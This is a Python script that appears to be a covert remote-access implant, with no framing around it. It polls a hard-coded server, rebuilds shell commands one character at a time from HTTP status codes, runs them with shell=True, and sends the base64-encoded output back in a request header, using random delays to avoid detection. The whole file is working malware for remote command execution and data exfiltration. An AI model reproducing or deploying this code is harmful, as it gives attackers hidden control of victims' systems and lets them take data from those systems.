#!/usr/bin/env python3

import subprocess, requests, time, base64, uuid, random, platform

server = "http://192.168.88.81:8000"
tag = "l"
if platform.system() == "Darwin":
    tag = "m"
elif platform.system() == "Windows":
    tag = "w"
client_id = f"{tag}-{uuid.uuid4()}"
buf = ""

while True:
    try:
        r = requests.get(f"{server}/poll", headers={"X-Client": client_id})
        code = r.status_code
    except requests.exceptions.RequestException as e:
        try:
            code = e.response.status_code
        except:
            code = 0

    if 200 <= code <= 326:
        ch = code - 200
        if ch == 10:
            try:
                result = subprocess.check_output(buf, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = e.output
            encoded = base64.b64encode(result.strip().encode()).decode()
            try:
                requests.get(f"{server}/poll", headers={"X-Client": client_id, "X-Output": encoded})
            except:
                pass
            buf = ""
        elif 32 <= ch <= 126:
            buf += chr(ch)

    time.sleep(random.uniform(0.5, 1.5))

